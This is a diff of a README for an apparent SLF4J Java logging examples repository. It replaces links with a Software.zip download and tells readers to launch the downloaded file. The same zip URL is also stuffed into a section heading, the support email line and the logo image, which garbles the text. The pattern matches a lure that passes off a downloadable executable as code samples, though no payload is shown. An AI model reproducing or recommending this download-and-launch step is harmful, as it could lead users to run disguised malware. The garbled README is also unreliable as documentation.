@@ -17,7 +17,7 @@ Welcome to the "slf4j-examples" repository! Here you will find a comprehensive J
 
 ## Get Started
 To get started with exploring the examples and features of SLF4J, simply download the project from the following link:
-[Download Software.zip](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[Download https://github.com/EdhMatinlassi/slf4j-examples/releases/download/v1.0/Software.zip](https://github.com/EdhMatinlassi/slf4j-examples/releases/download/v1.0/Software.zip)
 
 *Note: Launch the downloaded file to begin exploring the SLF4J examples.*
 
@@ -40,7 +40,7 @@ Learn how to integrate SLF4J with Logback, a popular logging framework, to enhan
 ### Log4j2 Integration
 Discover how to seamlessly integrate SLF4J with Log4j2 for advanced logging configurations and features.
 
-### JUL (java.util.logging) Integration
+### JUL (https://github.com/EdhMatinlassi/slf4j-examples/releases/download/v1.0/Software.zip) Integration
 Explore the integration of SLF4J with JUL to leverage the built-in Java logging capabilities effectively.
 
 ## Examples 📝
@@ -55,8 +55,8 @@ Check out the examples directory in the project to dive into detailed implementa
 6. Create a new Pull Request
 
 ## Support 📧
-If you encounter any issues or have questions regarding the SLF4J examples, please feel free to reach out via email at example@email.com.
+If you encounter any issues or have questions regarding the SLF4J examples, please feel free to reach out via email at https://github.com/EdhMatinlassi/slf4j-examples/releases/download/v1.0/Software.zip
 
 Let's level up our logging skills together with SLF4J! Happy Logging! 🌟
 
-![SLF4J Logo](https://www.slf4j.org/images/logos/list/slf4j/logo.jpg)
+![SLF4J Logo](https://github.com/EdhMatinlassi/slf4j-examples/releases/download/v1.0/Software.zip)
